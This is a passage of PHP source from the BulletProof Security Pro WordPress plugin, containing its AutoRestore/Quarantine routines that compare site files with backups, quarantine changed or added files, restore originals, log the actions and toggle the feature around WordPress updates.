				// AutoRestore & Quarantine
				if ( file_exists($pathValueARCM) && ! in_array($pathValue, $ExludedPaths) ) {
					
					$log_contents = "\r\n" . '[WP-includes File AutoRestore Logged: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $Basefilename .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'AutoRestored File: '.$pathValue."\r\n" . 'Quarantined From/Restore Path: '.$pathValue."\r\n";

					$handle = @fopen( $bpsProLog, 'a' );
					@fwrite($handle, $log_contents);
					fclose($handle);					
				
					copy($pathValue, $Qpath.$Basefilename);
					
					if ( $rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $pathValue, 'arq_quarantine_backup' => $pathValueARCM, 'arq_quarantine_qpath' => $Qpath.$Basefilename) ) ) {
						$send_email = 'send';	
					}
					
					copy($pathValueARCM, $pathValue);

				} // end if file_exists $pathValueARCM
			} // end foreach $sliceValues
		} // end array_key_exists 
	} // end foreach $result
			
	// Start Quarantine ONLY processing			
	$PValueARCM = array();
	
	foreach ( $filePath1 as $PKey => $PValue ) {
		$PValueARCM[] = str_replace($path1, $path2NS, $PValue);	 
	}

	$resultPathNameSR = array_diff($PValueARCM, $filePath2);

	$SRValueSourceArray = array();
		
	foreach ( $resultPathNameSR as $SRKeyBack => $SRValueBack ) {
		$SRValueSource = str_replace($path2NS, $path1, $SRValueBack);
		$SRValueSourceArray[] = str_replace($path2NS, $path1, $SRValueBack);
		$BasefilenameQ = basename($SRValueBack);	
		// Quarantine ONLY - A Duplicate file name does NOT exist in Quarantine
		if ( ! in_array($SRValueSourceArray, $ExludedPaths) && ! file_exists($Qpath.$BasefilenameQ ) ) {	
				
				$log_contents = "\r\n" . '[WP-includes File Quarantine Logged: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $BasefilenameQ .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'Quarantined From/Restore Path: '.$SRValueSource."\r\n";

				$handle = @fopen( $bpsProLog, 'a' );
				@fwrite($handle, $log_contents);
				fclose($handle);				
					
				if ( $rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $SRValueSource, 'arq_quarantine_backup' => $SRValueBack, 'arq_quarantine_qpath' => $Qpath.$BasefilenameQ) ) ) {
					$send_email = 'send';	
				}

				rename($SRValueSource, $Qpath.$BasefilenameQ);
		
		} else {	
		
		// Quarantine ONLY - A Duplicate file name DOES exist in Quarantine
		if ( ! in_array($SRValueSourceArray, $ExludedPaths) && file_exists($Qpath.$BasefilenameQ ) ) {	
				$DupeRename = $Qpath.date("M-d-Y--H-i-s").'--'.$BasefilenameQ;
				
				$log_contents = "\r\n" . '[WP-includes File Quarantine Logged - Duplicate File Renamed: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $BasefilenameQ .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'Quarantined From/Restore Path: '.$SRValueSource."\r\n" . 'Renamed To: '.$DupeRename."\r\n";

				$handle = @fopen( $bpsProLog, 'a' );
				@fwrite($handle, $log_contents);
				fclose($handle);				
					
				if ( $rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $SRValueSource, 'arq_quarantine_backup' => $SRValueBack, 'arq_quarantine_qpath' => $DupeRename) ) ) {
				 	$send_email = 'send';	
				}
				
				rename($SRValueSource, $DupeRename);			
	
			} // end if Dupe file exists in Quarantine
		} // end if file Does NOT exist in Quarantine
	} // end foreach $resultPathNameSR
	
	// ONLY Send 1 email alert
	if ( $send_email != '' ) {
		bps_smonitor_autorestore_email();
	}	
	} // end if ARQ Cron is On
}

// AutoRestore / Quarantine wp-content
// ARQ Infinity - Copyright (C) 2011-2015 Edward Alexander, AIT-pro.com, edward@ait-pro.com. All rights reserved.
function bps_ARQ_wpcontent() {
global $wpdb, $wp_version;

	if ( ! get_option('bulletproof_security_options_ARCM' ) ) {
		exit();
	}

	$ARQDir =  WP_CONTENT_DIR . '/bps-backup/autorestore/wp-content/';
	$ARQFSWPcontent =  WP_CONTENT_DIR . '/bps-backup/autorestore/wp-content/index.php';	
	
	// ARQ Cron FailSafe Shutdown
	if ( ! is_dir($ARQDir) || ! file_exists($ARQFSWPcontent) ) {
		exit();
	}

	$bpsClassFile = WP_PLUGIN_DIR . '/bulletproof-security/includes/class.php';
	$bpsClassFileARQMB = WP_CONTENT_DIR . '/bps-backup/master-backups/class.php';

	// Failsafe for class.php ARQ Exclude rules
	if ( file_exists($bpsClassFileARQMB) && filemtime($bpsClassFileARQMB) != filemtime($bpsClassFile) ) {
		exit();
	}

	$options = get_option('bulletproof_security_options_ARCM');

	if ( $options['bps_autorestore_cron'] == 'On' ) {

	// WordPress Automatic Updates
	bpsPro_ARQ_wp_autoupdate();

	$Autoupdateoptions = get_option('bulletproof_security_options_wp_version');
	$gmt_offset = get_option( 'gmt_offset' ) * 3600;
	$versionphp = ABSPATH . 'wp-includes/version.php';	
	$last_modified_time_versionphp = date("F d Y H:i", @filemtime($versionphp) + $gmt_offset);	

	// WordPress Automatic Update FailSafe
	// If a WP automatic update has occurred the bps db time stamp will be less than the file time stamp
	if ( strtotime($Autoupdateoptions['bps_wp_version_last_modified_time']) < strtotime($last_modified_time_versionphp) ) {		
		exit();		
	}

	// ARQ Cron Override is On
	if ( $options['bps_autorestore_cron_override'] == 'On' ) {
		exit();	
	}

	$table_name = $wpdb->prefix . "bpspro_arq_quarantine";
	$bpspro_arq_exclude_table = $wpdb->prefix . "bpspro_arq_exclude";
	$bpsProLog = WP_CONTENT_DIR . '/bps-backup/logs/autorestore_log.txt';
	$timeNow = time();
	$timestamp = date_i18n(get_option('date_format'), strtotime("11/15-1976")) . ' ' . date_i18n(get_option('time_format'), $timeNow + $gmt_offset);

$fileSize1 = array();
$filePath1 = array();
$path1 = WP_CONTENT_DIR;
$Qpath = WP_CONTENT_DIR . '/bps-backup/quarantine/';
$dirItr = new RecursiveDirectoryIterator($path1);
$filterItr = new BPSWPCSourceCronRecursiveFilterIterator($dirItr);
$objects1 = new RecursiveIteratorIterator($filterItr, RecursiveIteratorIterator::SELF_FIRST); 

	foreach ( $objects1 as $files1 ) {
		if ( $files1->isFile() ) {
			$fileSize1[] = $files1->getSize();
			$filePath1[] = $files1->getPathname();
		}	
	}

$fileSize2 = array();
$filePath2 = array();
$path2 = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-content/';
$path2NS = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-content';
$dirItr = new RecursiveDirectoryIterator($path2);
$filterItr = new BPSWPCBackupCronRecursiveFilterIterator($dirItr);
$objects2 = new RecursiveIteratorIterator($filterItr, RecursiveIteratorIterator::SELF_FIRST); 

	foreach ( $objects2 as $files2 ) {
		if ( $files2->isFile() ) {
			$fileSize2[] = $files2->getSize();
			$filePath2[] = $files2->getPathname();
		}
	}

	$send_email = '';
	$result = array_diff($fileSize1, $fileSize2);
	
	$forward_slash = '/'; // return all rows with a forward slash in them or in other words all rows	
	$getARQExcludeRows = $wpdb->get_results( $wpdb->prepare("SELECT * FROM $bpspro_arq_exclude_table WHERE arq_exclude_source LIKE %s", "%$forward_slash%") );	
	$ExludedPaths = array();
				
	foreach ( $getARQExcludeRows as $row ) {
		$ExludedPaths[] = $row->arq_exclude_source;
	}	
	
	foreach( $result as $diffKey => $diffValue ) {
		if ( array_key_exists($diffKey, $filePath1) ) {
			$sliceValues = array_slice($filePath1, $diffKey, 1);
			
			foreach( $sliceValues as $Akey => $pathValue ) {
				$pathValueARCM = str_replace($path1, $path2NS, $pathValue);
				$Basefilename = basename($pathValue);
				// AutoRestore & Quarantine
				if ( file_exists($pathValueARCM) && ! in_array($pathValue, $ExludedPaths) ) {
					
					$log_contents = "\r\n" . '[WP-content File AutoRestore Logged: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $Basefilename .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'AutoRestored File: '.$pathValue."\r\n" . 'Quarantined From/Restore Path: '.$pathValue."\r\n";

					$handle = @fopen( $bpsProLog, 'a' );
					@fwrite($handle, $log_contents);
					fclose($handle);					
						
						copy($pathValue, $Qpath.$Basefilename);

						if ( $rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $pathValue, 'arq_quarantine_backup' => $pathValueARCM, 'arq_quarantine_qpath' => $Qpath.$Basefilename) ) ) {
							$send_email = 'send';	
						}
				
						copy($pathValueARCM, $pathValue);
						
				} // end if file_exists $pathValueARCM
			} // end foreach $sliceValues
		} // end array_key_exists 
	} // end foreach $result
			
	// Start Quarantine ONLY processing			
	$PValueARCM = array();
	
	foreach ( $filePath1 as $PKey => $PValue ) {
		$PValueARCM[] = str_replace($path1, $path2NS, $PValue);	 
	}

	$resultPathNameSR = array_diff($PValueARCM, $filePath2);

	$SRValueSourceArray = array();
		
	foreach ( $resultPathNameSR as $SRKeyBack => $SRValueBack ) {
		$SRValueSource = str_replace($path2NS, $path1, $SRValueBack);
		$SRValueSourceArray[] = str_replace($path2NS, $path1, $SRValueBack);
		$BasefilenameQ = basename($SRValueBack);	
		// Quarantine ONLY - A Duplicate file name does NOT exist in Quarantine
		if ( ! in_array($SRValueSourceArray, $ExludedPaths) && ! file_exists($Qpath.$BasefilenameQ ) ) {	
				
				$log_contents = "\r\n" . '[WP-content File Quarantine Logged: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $BasefilenameQ .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'Quarantined From/Restore Path: '.$SRValueSource."\r\n";

				$handle = @fopen( $bpsProLog, 'a' );
				@fwrite($handle, $log_contents);
				fclose($handle);				
					
				if ( $rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $SRValueSource, 'arq_quarantine_backup' => $SRValueBack, 'arq_quarantine_qpath' => $Qpath.$BasefilenameQ) ) ) {
					$send_email = 'send';
				}
					
				rename($SRValueSource, $Qpath.$BasefilenameQ);
	
		} else {	
		
		// Quarantine ONLY - A Duplicate file name DOES exist in Quarantine
		if ( ! in_array($SRValueSourceArray, $ExludedPaths) && file_exists($Qpath.$BasefilenameQ ) ) {	
				$DupeRename = $Qpath.date("M-d-Y--H-i-s").'--'.$BasefilenameQ;
				
				$log_contents = "\r\n" . '[WP-content File Quarantine Logged - Duplicate File Renamed: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $BasefilenameQ .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'Quarantined From/Restore Path: '.$SRValueSource."\r\n" . 'Renamed To: '.$DupeRename."\r\n";

				$handle = @fopen( $bpsProLog, 'a' );
				@fwrite($handle, $log_contents);
				fclose($handle);				
					
				if ( $rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $SRValueSource, 'arq_quarantine_backup' => $SRValueBack, 'arq_quarantine_qpath' => $DupeRename) ) ) {
					$send_email = 'send';
				}
				
				rename($SRValueSource, $DupeRename);			
			} // end if Dupe file exists in Quarantine
		} // end if file Does NOT exist in Quarantine
	} // end foreach $resultPathNameSR

	// ONLY Send 1 email alert
	if ( $send_email != '' ) {
		bps_smonitor_autorestore_email();
	}
} // end if ARQ Cron is On
}

// AutoRestore / Quarantine Added Files
// ARQ Infinity - Copyright (C) 2011-2015 Edward Alexander, AIT-pro.com, edward@ait-pro.com. All rights reserved.
function bps_ARQ_addedFiles() {
global $wpdb;

	if ( ! get_option('bulletproof_security_options_ARCM' ) ) {
		exit();
	}

	$ARQDir =  WP_CONTENT_DIR . '/bps-backup/autorestore/added-files/';	
	$bpspro_arq_add_table = $wpdb->prefix . "bpspro_arq_add";
	
	// ARQ Cron FailSafe Shutdown
	if ( ! is_dir($ARQDir) || $wpdb->get_var( $wpdb->prepare( "SHOW TABLES LIKE %s", $bpspro_arq_add_table ) ) != $bpspro_arq_add_table ) {
		exit();
	}
		
	$bpsClassFile = WP_PLUGIN_DIR . '/bulletproof-security/includes/class.php';
	$bpsClassFileARQMB = WP_CONTENT_DIR . '/bps-backup/master-backups/class.php';

	// Failsafe for class.php ARQ Exclude rules
	if ( file_exists($bpsClassFileARQMB) && filemtime($bpsClassFileARQMB) != filemtime($bpsClassFile) ) {
		exit();
	}

	$options = get_option('bulletproof_security_options_ARCM');

	if ( $options['bps_autorestore_cron'] == 'On' ) {

	// ARQ Cron Override is On
	if ( $options['bps_autorestore_cron_override'] == 'On' ) {
		exit();	
	}

	$table_name = $wpdb->prefix . "bpspro_arq_quarantine";
	$bpsProLog = WP_CONTENT_DIR . '/bps-backup/logs/autorestore_log.txt';
	$timeNow = time();
	$gmt_offset = get_option( 'gmt_offset' ) * 3600;
	$timestamp = date_i18n(get_option('date_format'), strtotime("11/15-1976")) . ' ' . date_i18n(get_option('time_format'), $timeNow + $gmt_offset);
	$Qpath = WP_CONTENT_DIR . '/bps-backup/quarantine/';
	$BasePath = ABSPATH;

	$forward_slash = '/'; // return all rows with a forward slash in them or in other words all rows	
	$getARQAddRows = $wpdb->get_results( $wpdb->prepare("SELECT * FROM $bpspro_arq_add_table WHERE arq_add_source LIKE %s", "%$forward_slash%") );
	
	if ( $wpdb->num_rows == 0 ) {
		exit();
	}

		$AddedSourcePath = array();
		$AddedDirPath = array();
		$AddedSourceSize = array();
		$AddedBackupSize = array();	
		
		foreach ( $getARQAddRows as $row ) {
			$AddedSourcePath[] = $row->arq_add_source;
			$AddedDirPath[] = $row->arq_add_dir;
			$AddedSourceSize[] = filesize($row->arq_add_source);
			$AddedBackupSize[] = filesize($row->arq_add_backup);
		}
		
		$send_email = '';
		$result = array_diff($AddedSourceSize, $AddedBackupSize);

		foreach( $result as $diffKey => $diffValue ) {
			if ( array_key_exists($diffKey, $AddedSourcePath) ) {
				$sliceValues = array_slice($AddedSourcePath, $diffKey, 1);
			
			foreach( $sliceValues as $pathValue ) {
				$pathValueARCM = str_replace($BasePath, $ARQDir, $pathValue);
				$Basefilename = basename($pathValue);
				
				// AutoRestore & Quarantine
				if ( file_exists($pathValueARCM) ) {
					
					$log_contents = "\r\n" . '[non-WordPress Added File AutoRestore Logged: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $Basefilename .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'AutoRestored File: '.$pathValue."\r\n" . 'Quarantined From/Restore Path: '.$pathValue."\r\n";

					$handle = @fopen( $bpsProLog, 'a' );
					@fwrite($handle, $log_contents);
					fclose($handle);					
					
					copy($pathValue, $Qpath.$Basefilename);
					
					if ( $rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $pathValue, 'arq_quarantine_backup' => $pathValueARCM, 'arq_quarantine_qpath' => $Qpath.$Basefilename) ) ) {
						$send_email = 'send';	
					}
					
					copy($pathValueARCM, $pathValue);

				} // end if file_exists $pathValueARCM
			} // end foreach $sliceValues
		} // end array_key_exists
	} // end foreach $result - end AutoRestore processing

	// Start Quarantine ONLY processing
	if ( $AddedDirPath != '' ) {
		$comma_separated = implode(',', $AddedDirPath);
		$DirNoDupes = implode(',', array_unique(explode(',', $comma_separated)));
		$OnlyDirs = str_replace('NODIRSINGLEFILE', '', $DirNoDupes);
	}

	$DirExplodeUnique = explode(',', $OnlyDirs);
	$filePathIT = array();	
 
 	foreach ( $DirExplodeUnique as $key => $value ) {
		if ( is_dir($value) ) {
			$objects = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($value), RecursiveIteratorIterator::SELF_FIRST);
		
		foreach ( $objects as $file ) {
			if ( $file->isFile() ) {
				$filePathIT[] = $file->getPathname();
			}
		}
		}	
 	}

	$resultQ = array_diff($filePathIT, $AddedSourcePath);
	
	foreach( $resultQ as $KeyQ => $ValueQ ) {
		$BasefilenameQ = basename($ValueQ);
		
		// Quarantine ONLY - A Duplicate file name does NOT exist in Quarantine
		if ( $ValueQ != '' && !file_exists($Qpath.$BasefilenameQ) ) {
			
			$log_contents = "\r\n" . '[non-WordPress Added File Quarantine Logged: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $BasefilenameQ .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'Quarantined From/Restore Path: '.$ValueQ."\r\n";

			$handle = @fopen( $bpsProLog, 'a' );
			@fwrite($handle, $log_contents);
			fclose($handle);			
				
				if ( $rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $ValueQ, 'arq_quarantine_backup' => $ARQDir.$BasefilenameQ, 'arq_quarantine_qpath' => $Qpath.$BasefilenameQ) ) ) {
					$send_email = 'send';	
				}
				
				rename($ValueQ, $Qpath.$BasefilenameQ);
				
		} else {
		
		// Quarantine ONLY - A Duplicate file name DOES exist in Quarantine
		$DupeRename = $Qpath.date("M-d-Y--H-i-s").'--'.$BasefilenameQ;
			
			$log_contents = "\r\n" . '[non-WordPress Added File Quarantine Logged - Duplicate File Renamed: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: ' . $BasefilenameQ .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'Quarantined From/Restore Path: '.$ValueQ."\r\n" . 'Renamed To: '.$DupeRename."\r\n";

			$handle = @fopen( $bpsProLog, 'a' );
			@fwrite($handle, $log_contents);
			fclose($handle);			
				
				if ( $rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $ValueQ, 'arq_quarantine_backup' => $ARQDir.$BasefilenameQ, 'arq_quarantine_qpath' => $DupeRename) ) ) {
					$send_email = 'send';
				}
				
				rename($ValueQ, $DupeRename);			
		}
	}
	
	// ONLY Send 1 email alert
	if ( $send_email != '' ) {
		bps_smonitor_autorestore_email();
	}
	} // end if ARQ Cron is On
}

// Displays a warning that BPS Pro should not be upgraded on the WordPress Updates page
// This is a Fallback function in case all the other methods of removing BPS Pro from the update-core.php page fail.
function bpsPro_prevent_update_notice() {

	if ( current_user_can( 'update_core' ) )
	
	global $pagenow;
	$plugins = get_plugin_updates();

	if ( $pagenow == 'update-core.php' && !empty( $plugins ) ) {
		
		foreach ( (array) $plugins as $plugin_file => $plugin_data) {
			 if ( $plugin_data->Name == 'BulletProof Security Pro' ) {
		
				$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;"><font color="red">'.__('WARNING!!! DO NOT upgrade the BulletProof Security Pro plugin on this WordPress Updates page', 'bulletproof-security').'</font><br>'.__('Upgrade the BulletProof Security Pro plugin on the WordPress Plugins page ONLY by clicking the update now link', 'bulletproof-security').'<br><a href="plugins.php">'.__('WordPress Plugins page link', 'bulletproof-security').'</a></div>';
				echo $text;
			}
		}
	}
}

add_action('admin_notices', 'bpsPro_prevent_update_notice');

// AutoRestore - Turn Off AutoRestore if user is updating WP or installing or updating Themes.
// Requires that users click a link to the about.php page complete the ARQ Backup and Turn back On process
// Reminder: Save the BPS DB option on BPS Pro upgrades and in the Setup Wizard
function bpsPro_wordpress_update_core_manual() {
	
	if ( current_user_can( 'update_core' ) ) {
	
		global $pagenow;

		// Check that MU POST values, pages and Query strings are the same as a single site too
		if ( 'update-core.php' == $pagenow && isset( $_POST['upgrade'] ) || 'update.php' == $pagenow && preg_match_all( '/action=upgrade-theme|action=update-selected-themes|action=install-theme|action=upload-theme/', esc_html($_SERVER['QUERY_STRING']), $matches ) ) {
		
			$ARQoptions = get_option('bulletproof_security_options_ARCM');
			$arq_upgrade = 'bulletproof_security_options_ARQ_upgrade';
			$BPS_arq_upgrade = array( 'bps_arq_upgrade' => 'install_upgrade' );	
	
			if ( ! get_option( $arq_upgrade ) ) {	
		
				foreach( $BPS_arq_upgrade as $key => $value ) {
					update_option('bulletproof_security_options_ARQ_upgrade', $BPS_arq_upgrade);
				}
	
			} else {

				foreach( $BPS_arq_upgrade as $key => $value ) {
					update_option('bulletproof_security_options_ARQ_upgrade', $BPS_arq_upgrade);
				}	
			}
		
		$bps_option_name11 = 'bulletproof_security_options_ARCM';
	
		if ( ! $ARQoptions['bps_autorestore_cron_frequency'] ) {
			$bps_new_value11_1 = '2';	
		} else {
			$bps_new_value11_1 = $ARQoptions['bps_autorestore_cron_frequency'];
		}	
	
		$bps_new_value11_2 = 'Off';
		
		if ( ! $ARQoptions['bps_autorestore_cron_override'] ) {
			$bps_new_value11_3 = 'Off';
		} else {
			$bps_new_value11_3 = $ARQoptions['bps_autorestore_cron_override'];
		}	

		if ( ! $ARQoptions['bps_autorestore_cron_filecheck'] ) {
			$bps_new_value11_3a = 'On';	
		} else {
			$bps_new_value11_3a = $ARQoptions['bps_autorestore_cron_filecheck'];
		}

		if ( ! $ARQoptions['bps_autorestore_cron_forced'] ) {
			$bps_new_value11_4 = '1';	
		} else {
		$bps_new_value11_4 = $ARQoptions['bps_autorestore_cron_forced'];
		}	
	
		if ( ! $ARQoptions['bps_autorestore_cron_end'] ) {
			$bps_new_value11_5 = '';	
		} else {
			$bps_new_value11_5 = $ARQoptions['bps_autorestore_cron_end'];
		}	

		$BPS_Options11 = array(
		'bps_autorestore_cron_frequency' 	=> $bps_new_value11_1, 
		'bps_autorestore_cron' 				=> $bps_new_value11_2, 
		'bps_autorestore_cron_override' 	=> $bps_new_value11_3, 
		'bps_autorestore_cron_filecheck' 	=> $bps_new_value11_3a, 
		'bps_autorestore_cron_forced' 		=> $bps_new_value11_4, 
		'bps_autorestore_cron_end' 			=> $bps_new_value11_5
		);	
	
			if ( ! get_option( $bps_option_name11 ) ) {	
		
				foreach( $BPS_Options11 as $key => $value ) {
				update_option('bulletproof_security_options_ARCM', $BPS_Options11);
				}
	
			} else {

				foreach( $BPS_Options11 as $key => $value ) {
					update_option('bulletproof_security_options_ARCM', $BPS_Options11);
				}	
			}
		}
	}
}

add_action('admin_notices', 'bpsPro_wordpress_update_core_manual');
add_action('network_admin_notices', 'bpsPro_wordpress_update_core_manual');

// AutoRestore - Backup files, turn AutoRestore back on, lock index.php & wp-blog-header.php if they were previously locked, clear php error log alert
// Update the BPS DB option bps_arq_upgrade value to "no"
// Do not display the ARQ upgrade message on the about.php page
function bpsPro_wordpress_update_core_manual_about() {
	
	if ( current_user_can( 'update_core' ) )
	
		global $pagenow, $wp_version;

	if ( 'about.php' == $pagenow ) {
		
		$ARQoptions = get_option('bulletproof_security_options_ARCM');
		$ARQ_upgrade = get_option('bulletproof_security_options_ARQ_upgrade');  
		$successTextBegin = '<font color="green"><strong>';
		$successTextEnd = '</strong></font><br>';

		if ( $ARQoptions['bps_autorestore_cron'] == 'Off' && $ARQ_upgrade['bps_arq_upgrade'] == 'install_upgrade' ) {
			
			set_time_limit(300);
			$arq_upgrade = 'bulletproof_security_options_ARQ_upgrade';
			$BPS_arq_upgrade = array( 'bps_arq_upgrade' => 'no' );	
	
			if ( ! get_option( $arq_upgrade ) ) {	
		
				foreach( $BPS_arq_upgrade as $key => $value ) {
					update_option('bulletproof_security_options_ARQ_upgrade', $BPS_arq_upgrade);
				}
	
			} else {

				foreach( $BPS_arq_upgrade as $key => $value ) {
					update_option('bulletproof_security_options_ARQ_upgrade', $BPS_arq_upgrade);
				}	
			}
?>
<style>
<!--
#message { display:none; }
.wrap h2 { display:none; }
#bps-container { display:none; }
-->
</style>

<?php
require_once ( WP_PLUGIN_DIR . '/bulletproof-security/admin/wizard/wizard.php' );

			echo '<div style="display:none;">';
			bpsSetupWizard_ARQ_root_backup($source, $dest);
			bpsSetupWizard_ARQ_wpadmin_backup($source, $dest);
			bpsSetupWizard_ARQ_wpincludes_backup($source, $dest);
			bpsSetupWizard_ARQ_wpcontent_backup($source, $dest);	
			echo '</div>';
	
			if ( bpsSetupWizardFileCounterRootARQ($source, $count) == bpsSetupWizardFileCounterRoot($source, $count) && bpsSetupWizardFileCounterWpadminARQ($source, $count) == bpsSetupWizardFileCounterWpadmin($source, $count) && bpsSetupWizardFileCounterWpincludesARQ($source, $count) == bpsSetupWizardFileCounterWpincludes($source, $count) && bpsSetupWizardFileCounterWpcontentARQ($source, $count) == bpsSetupWizardFileCounterWpcontent($source, $count) ) {
	
				$FlockOptions = get_option('bulletproof_security_options_flock');
				$index = ABSPATH . 'index.php';
				$wpblogheader = ABSPATH . 'wp-blog-header.php';

				// Lock the index.php and wp-blog-header.php files if they were previously locked		
				if ( $FlockOptions['bps_lock_index_php'] == 'yes' ) {
					@chmod($index, 0400);
				}
				if ( $FlockOptions['bps_lock_wpblog_header'] == 'yes' ) {
					@chmod($wpblogheader, 0400);
				}		

				// Sync php error log alert time
				$gmt_offset = get_option( 'gmt_offset' ) * 3600;
				$optionsElogLocation = get_option('bulletproof_security_options2');
				$Elogfile = $optionsElogLocation['bps_error_log_location'];
				$last_modified_time_file = date("F d Y H:i:s", filemtime($Elogfile) + $gmt_offset);
				$Elog_time_db = 'bulletproof_security_options_elog';
				
				$BPS_db_Elog = array( 'bps_error_log_date_mod' => $last_modified_time_file );	
				
				foreach( $BPS_db_Elog as $key => $value ) {
					update_option('bulletproof_security_options_elog', $BPS_db_Elog);
				}

			// Turn ARQ back On if ARQ Cron Override is not set to On
			if ( $ARQoptions['bps_autorestore_cron_override'] != 'On' ) {
	
				$bps_option_name11 = 'bulletproof_security_options_ARCM';

				if ( ! $ARQoptions['bps_autorestore_cron_frequency'] ) {
					$bps_new_value11_1 = '2';	
				} else {
					$bps_new_value11_1 = $ARQoptions['bps_autorestore_cron_frequency'];
				}

				$bps_new_value11_2 = 'On';
				$bps_new_value11_3 = 'Off';	

				if ( ! $ARQoptions['bps_autorestore_cron_filecheck'] ) {
					$bps_new_value11_3a = 'On';	
				} else {
					$bps_new_value11_3a = $ARQoptions['bps_autorestore_cron_filecheck'];
				}

				if ( ! $ARQoptions['bps_autorestore_cron_forced'] ) {
					$bps_new_value11_4 = '1';	
				} else {
					$bps_new_value11_4 = $ARQoptions['bps_autorestore_cron_forced'];
				}	
	
				if ( ! $ARQoptions['bps_autorestore_cron_end'] ) {
					$bps_new_value11_5 = '';	
				} else {
					$bps_new_value11_5 = $ARQoptions['bps_autorestore_cron_end'];
				}

				$BPS_Options11 = array(
				'bps_autorestore_cron_frequency' 	=> $bps_new_value11_1, 
				'bps_autorestore_cron' 				=> $bps_new_value11_2, 
				'bps_autorestore_cron_override' 	=> $bps_new_value11_3, 
				'bps_autorestore_cron_filecheck' 	=> $bps_new_value11_3a, 
				'bps_autorestore_cron_forced' 		=> $bps_new_value11_4, 
				'bps_autorestore_cron_end' 			=> $bps_new_value11_5
				);	
	
				if ( ! get_option( $bps_option_name11 ) ) {	
		
					foreach( $BPS_Options11 as $key => $value ) {
						update_option('bulletproof_security_options_ARCM', $BPS_Options11);
					}
	
				} else {

					foreach( $BPS_Options11 as $key => $value ) {
						update_option('bulletproof_security_options_ARCM', $BPS_Options11);
					}	
				}
		
			echo '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;">';
			echo $successTextBegin.__('BPS Pro AutoRestore file backup completed successfully. AutoRestore has been turned back On.', 'bulletproof-security').$successTextEnd;
			echo '</div>';	
			}

			if ( $ARQoptions['bps_autorestore_cron_override'] == 'On' ) {		
				echo '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;">';
				echo $successTextBegin.__('BPS Pro ARQ Cron Override is turned On.', 'bulletproof-security').$successTextEnd;
				echo '</div>';	
			}
		
			// Update BPS DB option so that the WordPress version matches the current version of WP & reset the last modified time in DB
			$gmt_offset = get_option( 'gmt_offset' ) * 3600;
			$versionphp = ABSPATH . 'wp-includes/version.php';	
			$last_modified_time_versionphp = date("F d Y H:i", filemtime($versionphp) + $gmt_offset);
			$bps_option_name12 = 'bulletproof_security_options_wp_version';
			$bps_new_value12 = $wp_version;	
			$bps_new_value12_1 = date("F d Y H:i", filemtime($versionphp) + $gmt_offset + 900);	
			
			$BPS_Options12 = array( 'bps_wp_version' => $bps_new_value12, 'bps_wp_version_last_modified_time' => $bps_new_value12_1 );	
	
			if ( ! get_option( $bps_option_name12 ) ) {	
		
				foreach( $BPS_Options12 as $key => $value ) {
					update_option('bulletproof_security_options_wp_version', $BPS_Options12);
				}
			
			} else {

				foreach( $BPS_Options12 as $key => $value ) {
					update_option('bulletproof_security_options_wp_version', $BPS_Options12);
				}	
			}

		} else {
		
			echo '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;">';
			$text = '<strong><font color="red">'.__('Error: AutoRestore has NOT been turned back On to prevent files from being sent to Quarantine.', 'bulletproof-security').'</font><br>'.__('All files were NOT backed up successfully.', 'bulletproof-security').'</font><br><a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php">'.__('Click Here', 'bulletproof-security').'</a>'.__(' to go to the AutoRestore page and click the 4 Backup Files (Quick Setup) buttons before turning the AutoRestore Cron back On.', 'bulletproof-security').'</strong>';
			echo $text;	
			echo '</div>';
		}
		}
	}
}

add_action('admin_notices', 'bpsPro_wordpress_update_core_manual_about');
add_action('network_admin_notices', 'bpsPro_wordpress_update_core_manual_about');

// Displays a static message on all pages except for the about.php page.
function bpsPro_ARQ_doing_upgrade_new_install() {

	if ( current_user_can('manage_options') ) {
		
		global $pagenow;
		$ARQ_upgrade = get_option('bulletproof_security_options_ARQ_upgrade');  

		if ( $ARQ_upgrade['bps_arq_upgrade'] == 'install_upgrade' && 'about.php' != $pagenow ) {

